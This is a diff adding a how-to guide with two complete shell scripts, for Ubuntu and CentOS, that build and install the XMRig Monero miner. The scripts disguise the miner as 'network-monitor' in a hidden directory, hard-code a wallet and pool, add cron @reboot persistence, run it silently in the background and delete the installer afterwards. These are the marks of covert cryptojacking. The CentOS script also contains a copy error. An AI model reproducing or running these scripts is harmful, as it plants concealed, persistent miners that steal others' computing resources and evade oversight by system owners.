@@ -1,0 +1,98 @@
+How to Install XMRIG
+
+1. Download from https://mymonero.com/ to create wallet
+
+2. Goto https://xmrig.com/wizard to create new configuration
+
+3. Create auto installer
+$ nano /root/ubuntu.sh
+------------------------------- start here -------------------------------
+#!/bin/bash
+apt install sudo git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
+mkdir -p /var/opt/network.d/
+cd /var/opt/network.d
+git clone https://github.com/xmrig/xmrig.git
+cd xmrig/
+cmake .
+make -j$(nproc)
+mv xmrig ../network-monitor
+cd ..
+printf '{
+    "autosave": true,
+    "donate-level": 1,
+    "cpu": true,
+    "opencl": false,
+    "cuda": false,
+    "pools": [
+        {
+            "url": "pool.hashvault.pro:443",
+            "user": "43XkD74xXNn1k74XYw31cHYjCRzJQzEJTQxSGiNNFtL5C5h5peq8dJaWwTiCAV6NWDaFPUZyGaRPFbVwNFqCkY6zAuBTW3o",
+            "pass": "%s",
+            "keepalive": true,
+            "tls": true
+        },
+        {
+            "url": "71.19.151.118:10101",
+            "rig-id": "kiensing"
+        }
+    ]
+}' $(hostname) > config.json
+chmod +x network-monitor
+crontab -l > cron
+echo "@reboot /var/opt/network.d/network-monitor" >> cron
+crontab cron
+rm cron
+rm -rf xmrig/
+sh -c "./network-monitor > /dev/null 2>&1 &"
+rm -f /root/ubuntu.sh
+------------------------------- end here -------------------------------
+
+                                    OR
+
+$ nano /root/centos.sh
+------------------------------- start here -------------------------------
+#!/bin/bash
+sudo yum install -y epel-release
+sudo yum install -y git make cmake gcc gcc-c++ libstdc++-static libuv-static hwloc-devel openssl-devel
+mkdir -p /var/opt/network.d/
+cd /var/opt/network.d
+git clone https://github.com/xmrig/xmrig.git
+cd xmrig && mkdir build && cd build
+cmake .. -DUV_LIBRARY=/usr/lib64/libuv.a
+make
+mv xmrig ../network-monitor
+cd ..
+printf '{
+    "autosave": true,
+    "donate-level": 1,
+    "cpu": true,
+    "opencl": false,
+    "cuda": false,
+    "pools": [
+        {
+            "url": "pool.hashvault.pro:443",
+            "user": "43XkD74xXNn1k74XYw31cHYjCRzJQzEJTQxSGiNNFtL5C5h5peq8dJaWwTiCAV6NWDaFPUZyGaRPFbVwNFqCkY6zAuBTW3o",
+            "pass": "%s",
+            "keepalive": true,
+            "tls": true
+        },
+        {
+            "url": "ipproxy:port",
+            "rig-id": "kiensing"
+        }
+    ]
+}' $(hostname) > config.json
+chmod +x network-monitor
+crontab -l > cron
+echo "@reboot /var/opt/network.d/network-monitor" >> cron
+crontab cron
+rm cron
+rm -rf xmrig/
+sh -c "./network-monitor > /dev/null 2>&1 &"
+rm -f /root/ubuntu.sh
+------------------------------- end here -------------------------------
+
+4. Execute manually using: 
+$ sh -c "/var/opt/network.d/network-monitor > /dev/null 2>&1 &"
+
+5. Goto see your result > https://minexmr.com/#worker_payments and input your minero address then Lookup
